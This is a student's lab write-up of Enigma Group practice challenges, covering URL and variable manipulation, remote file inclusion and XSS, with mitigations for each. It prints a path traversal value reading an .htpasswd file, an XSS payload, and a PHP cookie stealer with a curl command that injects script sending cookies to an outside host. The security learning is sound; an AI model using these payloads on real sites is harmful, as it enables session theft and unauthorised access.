# Enigma Group Project #3

## Student Information

* Student name: **Benjamin Greenberg**
* NetId: **bgreenb3**
* Enigma group profile: <https://www.enigmagroup.org/profile/66636>


## Project Description

In this project, you will be complete the following challenges on [Enigma Group](https://www.enigmagroup.org/pages/challenges): Basic 27 (URL manipulation), Basic 30–32 (variable manipulation), and 40–41 (XSS). After completing each challenge you will complete the following worksheet describing:
1. The credentials found in the challenge (if any).
2. How you solved the challenge. Include any JavaScript or other scripts you used to solve these challenges.
3. What sins (as found in the *24 Deadly Sins* book) are evidenced in the challenge.
4. How those sins should be addressed to address your exploit.

You can find a basic guide for markdown formatting [here](https://www.markdownguide.org/basic-syntax/). In particular, note the [code section](https://www.markdownguide.org/basic-syntax/#code) which should be used to annotate any code or commands used in your writeup.


## Challenges

---
### Basic 27

#### Credentials
User: administrator
Password: 3e0f84

#### How you passed the challenge
1) Tried logging in and saw that the error page displayed what was in the file parameter in the url
2) Saw that the website was looking for ```password.php``` and replaced the file parameter with ```password.php```
3) Used the password for administrator stored in ```password.php```

#### What sins are evidenced in this challenge
Sin #12, Sin #2

#### How could those sins be mitigated
Be careful about what error information is displayed 
Make sensitive files unreadable to unauthorized users



---
### Basic 30

#### Credentials
Username: admin
Password: dog

#### How you passed the challenge
1) I saw that the website took user input through the ```$page``` parameter
2) I looked in ```pages/``` and didn't find ```.htpasswd``` in there
3) I set ```$page='../admin/.htpasswd``` to get the password hash 
4) I used john the ripper to decrypt the password

#### What sins are evidenced in this challenge
Sin #2, Sin #12

#### How could those sins be mitigated
Don't leave files with sensitive access/information user readable
Be careful about what error information is displayed 
Don't use user input in filenames and use to switch statement loaded files



---
### Basic 31

#### Credentials
N/A

#### How you passed the challenge
1) I noticed that the url was odd, but when I tried changing ```index2.html``` to ```index.html``` it just redirected anyways
2) I then went to the source code of ```index2.html``` and changed the url to ```index.html``` which should me index's source code
3) I looked in the source code of ```index.html``` and noticed the odd php file ```911_411.php```
4) I went to the odd php file and completed the mission

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Don't leave files with sensitive access/information user readable



--- 
### Basic 32

#### Credentials
N/A

#### How you found the credentials
```http://challenges.enigmagroup.org/basics/vm/3/index.php?page=http://challenges.enigmagroup.org/basics/vm/3/index.php?page=news```
I used the url of the website as a remote url 

#### What sins are evidenced in this challenge
Sin #2 - RFI

#### How could those sins be mitigated
Don't use user input in filenames and use to switch statement loaded files



---
### Basic 40

#### Credentials
N/A

#### How you found the credentials
```http://challenges.enigmagroup.org/basics/xss/1/index.php?search=<script>alert("test");</script>```
I found that the search parameter could accept user input and put the ```alert()``` in there

#### What sins are evidenced in this challenge
Sin #3 - XSS

#### How could those sins be mitigated
Validate user input



---
### Basic 41

#### Credentials
Cookie: admin=d02be8

#### How you found the credentials
1) I figured out how to send scripts to the website through the user agent
2) After spending hours with no success, I found out through classmates that the only way the website will respond is if a cookie stealer sent to through the UA
3) I built the cookie stealer and eventually stole the cookie
4) Then I sent the cookie back using curl to complete the mission

##### Cookie Stealer
```php
<?php
  $cookie = $_GET["cookie"];
  mail("bgreenb3@vols.utk.edu", "Enigma Group Cookies", $cookie);
?>
```

##### Curl to steal the cookie
```bash
curl http://challenges.enigmagroup.org/basics/xss/2/ -A "<script>document.location='http://volweb2.utk.edu/~bgreenb3/index.php?cookie=' + document.cookie;</script>" --cookie "PHPSESSID=hb948026e0k0vudle7vhpfldl0"
```

##### Curl to get admin access
```bash
curl http://challenges.enigmagroup.org/basics/xss/2/  --cookie "PHPSESSID=hb948026e0k0vudle7vhpfldl0;admin=d02be8"
```

#### What sins are evidenced in this challenge
Sin #3 - XSS

#### How could those sins be mitigated
Validate user input
Don't build DOM elements based on direct user input


